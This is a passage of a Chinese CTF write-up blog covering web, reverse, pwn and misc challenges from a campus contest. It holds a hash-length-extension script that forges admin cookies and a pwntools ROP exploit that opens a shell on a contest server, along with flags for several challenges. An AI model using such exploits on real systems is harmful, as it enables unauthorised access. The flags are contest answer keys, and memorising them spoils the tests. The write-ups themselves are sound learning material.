+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctt</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$t=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($key);++$i)</span><br><span class="line">	&#123;</span><br><span class="line">		$t.=chr(ord($key[$i])^$i);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $t;</span><br><span class="line">&#125;</span><br><span class="line">            $auth = <span class="keyword">false</span>;</span><br><span class="line">            $role1 = <span class="string">"xxxxxxxxx"</span>;</span><br><span class="line">            $salt = <span class="string">"xxxxxxxxxx"</span>;<span class="comment">//长度不超过15</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role_true"</span>])) &#123;</span><br><span class="line">                $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">                <span class="keyword">if</span> ($_COOKIE[<span class="string">"role_true"</span>] === $role1 &amp;&amp; $hsh === md5($salt.urldecode($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">                    $auth = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $auth = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $s =$role1;</span><br><span class="line">                setcookie(<span class="string">'role'</span>,ctt(base64_encode($s)));</span><br><span class="line">				</span><br><span class="line">                $hsh = md5($salt.ctt(base64_encode($s)));</span><br><span class="line">                setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is "</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Only True Admin can see the flag!!&lt;/h3&gt;"</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们用<code>alert(document.cookie)</code>在控制台获取网页的 cookie 值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=YVPweR3oRN%3B%7Bnj32; hsh=5beee4019e55f453db9daf0df7d90879</span><br></pre></td></tr></table></figure>
+
+<p>经过反推，我们可以获得真实的<code>$role1</code>值为<code>adminadmin</code><br>因为<code>ctt(base64_encode($s))</code>的值为<code>YVPweR3oRN;{nj32</code><br>且<code>md5($salt.ctt(base64_encode($s)))</code>的值为<code>5beee4019e55f453db9daf0df7d90879</code></p>
+<p>接下来就是写脚本的时间了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    m = hashpumpy.hashpump(<span class="string">'5beee4019e55f453db9daf0df7d90879'</span>, <span class="string">'YVPweR3oRN%3B%7Bnj32'</span>, <span class="string">'binLep'</span>, i)</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    url = <span class="string">'http://47.93.249.236:10008/'</span></span><br><span class="line">    digest = m[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    message = urllib.quote(urllib.unquote(m[<span class="number">1</span>]))</span><br><span class="line">    cookie = <span class="string">'role='</span> + message + <span class="string">'; hsh='</span> + digest + <span class="string">'; role_true=adminadmin'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">print</span> headers</span><br><span class="line">    re = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">print</span> re.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag&#123;"</span> <span class="keyword">in</span> re.text:</span><br><span class="line">        <span class="keyword">print</span> re;</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-8"><a href="#Flag-8" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hash_and_php_are_very_good!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h2><h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>输入需要的字符，会返回正确的flag<br>附件 <a href="https://ctf.cdusec.com/upload/Windows.zip" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/Windows.zip</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution:"></a>Solution:</h3><p>输入<code>cdusecre</code>即可，用 IDA 能看出来</p>
+<hr>
+<h3 id="Flag-9"><a href="#Flag-9" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cdusecre_1&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="一千次Flag"><a href="#一千次Flag" class="headerlink" title="一千次Flag"></a>一千次Flag</h2><h3 id="Description-10"><a href="#Description-10" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>一千次一个flag，童叟无欺<br>附件:<a href="https://ctf.cdusec.com/upload/RECCC.zip" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/RECCC.zip</a><br>hint:使用OllyDBG进行动态调试(网上的版本都行)</p>
+</blockquote>
+<hr>
+<h3 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution:"></a>Solution:</h3><p>用 CE 可以看出计数的数据地址为<code>0x004A32C0</code></p>
+<p>这样我们就能找到具体的函数地址，为<code>0x00401277</code></p>
+<p>在函数里有一个 if 语句<code>if ( dword_4A32C0 == 1000 )</code>，这里我用 IDA 的 patch 直接把 1000 改为 1，方便调试</p>
+<p>接下来发现只有 flag 的前 10 位能够正常显示，到后面就变成加密形式也不能复制了</p>
+<p>我们进入修改的 if 语句里面调用对函数看看<code>result = sub_401323();</code></p>
+<p>可以看到这段代码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_4A32C4 &gt; <span class="number">10</span> )</span><br><span class="line">    result = sub_4015F8((HWND)<span class="number">0x52010001</span>, <span class="number">369164292</span>, <span class="number">18</span>, <span class="number">-1</span>, (<span class="keyword">unsigned</span> __int8 *)<span class="number">2</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们把这段代码里面的 10 patch 大一点就好了，比如说 0x20</p>
+<p>然后应用 patch，再点点鼠标就完了</p>
+<hr>
+<h3 id="Flag-10"><a href="#Flag-10" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5538189634510&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="你会用Android-Studio吗"><a href="#你会用Android-Studio吗" class="headerlink" title="你会用Android Studio吗"></a>你会用Android Studio吗</h2><h3 id="Description-11"><a href="#Description-11" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>Android Studio Usage<br>附件 <a href="https://ctf.cdusec.com/upload/as.zip" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/as.zip</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution:"></a>Solution:</h3><p>flag 在 hanhan.java 里，base64 解码一次就行了</p>
+<hr>
+<h3 id="Flag-11"><a href="#Flag-11" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You are simple and honest&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="猜数？"><a href="#猜数？" class="headerlink" title="猜数？"></a>猜数？</h2><h3 id="Description-12"><a href="#Description-12" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>Linux Reverse<br>What’s the number？<br>附件 <a href="https://ctf.cdusec.com/upload/Linux.zip" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/Linux.zip</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-12"><a href="#Solution-12" class="headerlink" title="Solution:"></a>Solution:</h3><p>利用 pwndbg 在汇编<code>cmp  [rbp+var_10], rax</code>处下个断点<code>b *$rebase(0x8E6)</code></p>
+<p>然后根据 IDA 里面显示的字符串填数就完了</p>
+<p>具体 gdb 步骤如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">start</span><br><span class="line">b *<span class="variable">$rebase</span>(0x8E6)</span><br><span class="line">随便输入什么东西</span><br><span class="line">p <span class="variable">$rbp</span> - 0x10  [显示 --&gt; <span class="variable">$1</span> = (void *) 0x7fffffffdfb0]</span><br><span class="line">x/w 0x7fffffffdfb0  [显示 --&gt; 0x7fffffffdfb0:	23231]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-12"><a href="#Flag-12" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cdusec_wsj_23231&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="Description-13"><a href="#Description-13" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>Run it With Python<br>附件 <a href="https://ctf.cdusec.com/upload/2.py" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/2.py</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-13"><a href="#Solution-13" class="headerlink" title="Solution:"></a>Solution:</h3><p><strong>源码如下：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"Plase input your flag:"</span>)</span><br><span class="line">b = <span class="string">b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'</span></span><br><span class="line">a = input()</span><br><span class="line">a = a.encode()</span><br><span class="line">c = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    c = c + chr(i ^ <span class="number">3</span>)</span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> c.encode() == b:</span><br><span class="line">    print(<span class="string">"youare right:"</span>)</span><br><span class="line">    print(a)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"wrong!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>逆着推即可</p>
+<p><strong>exp如下：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="string">b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'</span></span><br><span class="line">c = b.decode()</span><br><span class="line">a = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    a += chr(ord(i) ^ <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">a = a.decode()</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-13"><a href="#Flag-13" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cdusec_rec2_easy&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><h3 id="Description-14"><a href="#Description-14" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>Get Shell With Pwntools<br>附件 <a href="https://ctf.cdusec.com/upload/pwn.zip" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/pwn.zip</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-14"><a href="#Solution-14" class="headerlink" title="Solution:"></a>Solution:</h3><p>送分题，不过给的后门没法直接用，需要自己构造一下</p>
+<p><strong>exp如下：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="comment"># context(log_level="debug", arch="amd64", os="linux")</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./Shell'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.93.249.236'</span>, <span class="number">10010</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Shell'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">plt_system = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">addr_rdi_r = <span class="number">0x0000000000400633</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x12</span></span><br><span class="line">pd += p64(addr_rdi_r)</span><br><span class="line">pd += p64(<span class="number">0x40065B</span>)</span><br><span class="line">pd += p64(plt_system)</span><br><span class="line">p.send(pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-14"><a href="#Flag-14" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cdusec_Pwn_New_Star!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="G1F"><a href="#G1F" class="headerlink" title="G1F"></a>G1F</h2><h3 id="Description-15"><a href="#Description-15" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>你相信目光的速度吗？<br>附件:<a href="https://ctf.cdusec.com/upload/Misc.rar" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/Misc.rar</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-15"><a href="#Solution-15" class="headerlink" title="Solution:"></a>Solution:</h3><p>从这直接看到信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strings <span class="number">2.</span>gif | grep flag</span><br><span class="line"></span><br><span class="line">flag <span class="keyword">is</span> <span class="keyword">not</span> here,<span class="keyword">try</span> the <span class="string">'pk'</span></span><br></pre></td></tr></table></figure>
+
+<p>直接改后缀为 rar，出现一堆加密字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%26%23113%3B%26%23119%3B%26%23108%3B%26%23114%3B%26%23123%3B%26%23744810295113%3B%26%2349%3B%26%23121%3B%26%23111%3B%26%2395%3B%26%2369%3B%26%23115%3B%26%2349%3B%26%23100%3B%26%23125%3Bw+h+a+t%27s%20t+h+e%20n+e+x+t%20a+f+t+e+r+t%20t+h+e+U+R+L</span><br></pre></td></tr></table></figure>
+
+<p>Unescape后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="comment">#113;&amp;#119;&amp;#108;&amp;#114;&amp;#123;&amp;#744810295113;&amp;#49;&amp;#121;&amp;#111;&amp;#95;&amp;#69;&amp;#115;&amp;#49;&amp;#100;&amp;#125;w+h+a+t's t+h+e n+e+x+t a+f+t+e+r+t t+h+e+U+R+L</span></span><br></pre></td></tr></table></figure>
+
+<p>将中间部分补全以后进行转义得到如下字符串</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwlr&#123;J0f_q1yo_Es1d&#125;w+h+a+t<span class="string">'s t+h+e n+e+x+t a+f+t+e+r+t t+h+e+U+R+L</span></span><br></pre></td></tr></table></figure>
+
+<p>再来个正常凯撒一连串爆破解密就好</p>
+<hr>
+<h3 id="Flag-15"><a href="#Flag-15" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_f1nd_Th1s&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h2><h3 id="Description-16"><a href="#Description-16" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>Base64 32 16 run run run run run!<br>附件: <a href="https://ctf.cdusec.com/upload/Base.zip" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/Base.zip</a></p>
+</blockquote>
+<hr>
+<h3 id="Solution-16"><a href="#Solution-16" class="headerlink" title="Solution:"></a>Solution:</h3><p>写了个脚本</p>
+<p><strong>exp如下：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str_enc = <span class="string">'R1JBVEtRSlVHTTJUTU5DQ0dSQ0RJTVpVSVkyRUVOSlNHUkFUSU5KVUlJMlRJTkNER01aRElPSlVHVTJUU05KVkdNWkRLTlJVR00yVE1OQlhHUVpESU9CVUdZMkRTTkpXR1JCVEdNUlVJRTJUTU1aVkdRM0RJTkpWR0kyVEdOQ0dHUkJES01SVUhFMlRJTkJWR1UyREtOQlRHSTJFQ05KV0dNMkRJTkpUR1EyVEVOQ0NHVVpESU5aVUdZMkRRTkJWR1E0VEtOSlZHTTJETU5DQkdWQVRHTkpVRzQyVE9OQ0VHUVpUS01aVUlJMlRFTkJaR1UyRElNSlZHUTJUR05CV0dSQkRJTkpWSUUyVE1OQlRHVTNESU1aVkdNMkRTTkpXR1E0RElOWlZHNDJURU5DQkdVWkRJUUpWR1kyRUVOQlZHTVpER05SVkdNMkVNTkJaR1UzRElRUlZHUTJEQ05KVUdVWlRLTkpVSUkyVEtOSlpHVTJUR05CVUlRMkRHTkJXR1EzVElNUlVJRTJES05CWkdVM1RLTVpVR00yRUNOS0JHUkJESU5KVUlJWlRNTkpUR1JDVElRUlZHSTJFQ05CVkdSQ0RLTkJWR00yREtOQ0NHUTJUS1FKVUdZMkRHTVpTR1VaVElSSlZHQTJERU5CWUdRMlRJUVJWR1kyRUNOSlVHUkJESU5SVUlJMkRNTkNDR1JDRElRUlVJWTJET05CU0dRWlRLTkJVR0UyVEtOSlRHVTJUSVFSVUdVMlRTTkJWR00yREdNUlRHSTJFQ05KUUdSQVRJTlpWR1UyRFNOSldHUkJUS09KVUlFMlVDTkpXR1UyVElRUlVJUTJFRU5DR0dSQ1RJUUpVSEUyVFFOSlRHVTJES01aVUdZMkVFTkpWR1U0VEtOSlRHUTJURU5CVEdVM0RLTUJVR0kyRE9OSllHVTJUS01KVUlFMlRDTkNDR1JBVElRUlVHNDJEU05KUkdVWlRJUlJVSUkyVEVOQlRHVTRES05KVkdRMkVHTVpTR1JCRElRSlVHUTJES01aVUdVWkRJTVpWR1kyRE9OQldHUTNUS05SVUhFMlRJTkNER1U0VElRSlZJRTJER05KV0dRWlRJUkJUR0kyVEVOQ0NHVVpESVFSVkdRMkRHTkpVR1JCVEdNUlVJRTJUS05KWkdRM0RJTkpWR1kyREdOSlNHUTNUSU5SVUhBMkRNTkJaR1UzRElRWlRHSTJFQ05KV0dRWlRJTlJVSUlaVE1OQlRHUkRESVFSVkdJMkRTTkpVR1FaVEtOQlVJTTJFRU5DQ0dRMlRLT0pWR1VaVElOSlNHUkJES05SVUc0MkRFTkJZR1EyVElPSlZHWTJFR05KWkdSQVRLTlJUR1UyREtOQlRHUkNESU1aVkdNMkRTTkpTR1JCREtOQlVHRTJUSU5KVEdVMlRJUVJWR1UyVUNOSldHUVpUS05SVUdNMlRHTkJaR1ZBVElPQlVHWTJEU05KVkdSQVRLTVJVSUUyVE1OQ0NHUTJUR01SVEdVWlRFTkNHR1E0VEtOUlVJUTJUSU5CVEdVMkRLTVpVR1UyRUVOSldHTTJES05KVEdRMlRFTkJUR1UzRElOWlVHSTJFQ05CV0dRNFRLTkpVSUUyVEVOQ0JHVkFUSVFSVUdVMkVFTVpXR1VaVElSSlVJSTJURU5DQ0dVNERLTUpWR1EyVEdOSlZHUkJESU5KVkhFMlRLTVpTR1UzRElNWlVJVTJUQU5CV0dRNERJTkpVSUkyVE1OQ0JHVVlUSVFKVklFMkVFTkJXR1FaVElSSlVJSTJFS05KUUdSQVRJTUpWR1EyREdOSlVHUkJUSVFSVUlJMkRLTkpaR1EyVEdOQlZHWTJER05KV0dRM1RJUkpVSEUyVE1OQlpHVTJUS01aVUc0MkVDTktCR1FaVElOUlVJSTJFSU5DQ0dVWURJUVJWR0kyRE9OSllHUkRES05CVkdNMlRLTkJaR1UyVEtPSlZHVVpUSU5KU0dRWlRLTlJWR0EyREVOQllHUTRES05KVklFMlVDTkpSR1JCRElRSlVJSTJETU5DQ0dSQ0RJTVpVSVkyRUtOQ0ZHUTJUS09CVkdVMlRJTkNDR1EyVElRUlVJRTJESU5CVkdNMkRLTVJVR00yVEVOQlhHUVpESVFKVUdVMkRTTkpaR1ZBVEtOUlVJRTJVQ05CVEdVM0RJTVpUR1kyVEdOQ0ZHUTRUS01SVUlJMlRRTkpSR1UyREtNUlZHRTJEU05KVkdVNFRLTkpUR0laVEVOSlRHVVpESU5aVUdJMkRRTkJWR1JCREtOUlVJRTJUQ05DQkdWQVRJT0pWR1FaVEVOSlFHUTRUR1JBPQ=='</span></span><br><span class="line">str_enc = base64.b64decode(str_enc)</span><br><span class="line">str_enc = base64.b32decode(str_enc)</span><br><span class="line">str_enc = base64.b16decode(str_enc)</span><br><span class="line">str_enc = base64.b32decode(str_enc)</span><br><span class="line">str_enc = base64.b64decode(str_enc)</span><br><span class="line">str_enc = base64.b16decode(str_enc)</span><br><span class="line">str_enc = base64.b64decode(str_enc)</span><br><span class="line">str_enc = base64.b16decode(str_enc)</span><br><span class="line">str_enc = base64.b32decode(str_enc)</span><br><span class="line">str_enc = base64.b64decode(str_enc)</span><br><span class="line"><span class="keyword">print</span> str_enc</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-16"><a href="#Flag-16" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Cdu_sec_Base64&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><h3 id="Description-17"><a href="#Description-17" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>怎么做CTF题呢？<br>首先，我会告诉你这道题的flag<br><br>是: flag{welc0me_to_cdusec_Ctf}<br><br><br><br>然后，把上面这串答案，粘贴到下面的框框里<br>再点击提交，这道题就解出来了<br><br><br>很简单吧，来试试？<br><br><br>第二届玄武杯交流群：963109101 </p>
+</blockquote>
+<hr>
+<h3 id="Solution-17"><a href="#Solution-17" class="headerlink" title="Solution:"></a>Solution:</h3><p>水过</p>
+<hr>
+<h3 id="Flag-17"><a href="#Flag-17" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;welc0me_to_cdusec_Ctf&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><h3 id="Description-18"><a href="#Description-18" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>RESXCQAZWDXTGBNJUEWQASDCXZWERSXDFCVEWQAZXC<br><br><br>flag格式：flag{*************}</p>
+</blockquote>
+<hr>
+<h3 id="Solution-18"><a href="#Solution-18" class="headerlink" title="Solution:"></a>Solution:</h3><p>照着键盘画画就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RESXC     --&gt; C</span><br><span class="line">QAZWDX    --&gt; D</span><br><span class="line">TGBNJU    --&gt; U</span><br><span class="line">EWQASDCXZ --&gt; S</span><br><span class="line">WERSXDFCV --&gt; E</span><br><span class="line">EWQAZXC   --&gt; C</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Flag-18"><a href="#Flag-18" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;CDUSEC&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="大力出奇迹"><a href="#大力出奇迹" class="headerlink" title="大力出奇迹"></a>大力出奇迹</h2><h3 id="Description-19"><a href="#Description-19" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
+<p>附件 <a href="https://ctf.cdusec.com/upload/baopo.zip" target="_blank" rel="noopener">https://ctf.cdusec.com/upload/baopo.zip</a><br><br>hint<br>密码长度为五位<br>数字当然不能少<br>字母有大也有小<br>没有符号和空格<br>快来猜猜密码啥<br>猜对你就进去啦</p>
+</blockquote>
